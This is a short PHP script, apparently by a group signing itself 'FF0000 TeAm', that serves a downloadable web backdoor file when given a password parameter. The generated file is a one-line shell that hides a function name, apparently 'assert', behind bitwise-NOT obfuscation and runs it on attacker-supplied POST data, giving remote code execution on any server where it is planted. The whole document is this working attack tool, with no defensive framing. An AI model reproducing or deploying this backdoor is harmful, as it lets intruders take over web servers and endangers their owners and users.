<?php
//FF0000 TeAm
error_reporting(0);
$pwd=$_GET['pwd'];
$filename='FF0000TeAm.php';
//Content
$web_backdoor='';
$web_backdoor.='<?php ';
$web_backdoor.='$x=~¾¬¬º­«;$x($_POST[\''.$pwd.'\']);';
$web_backdoor.=' ?>';
//END
if($pwd){
	header('Content-Encoding: none');
	header('Content-Type: '.(strpos($HTTP_SERVER_VARS['HTTP_USER_AGENT'], 'MSIE') ? 'application/octetstream' : 'application/octet-stream'));
	header('Content-Disposition: '.(strpos($HTTP_SERVER_VARS['HTTP_USER_AGENT'], 'MSIE') ? 'inline; ' : 'attachment; ').'filename="'.$filename);
	header('Content-Length: '.strlen($web_backdoor));
	header('Pragma: no-cache');
	header('Expires: 0');
	echo $web_backdoor;
}
echo 'Please input the PWD parameters generated file:)';
echo '<hr>';
echo 'FF0000TeAm';
?>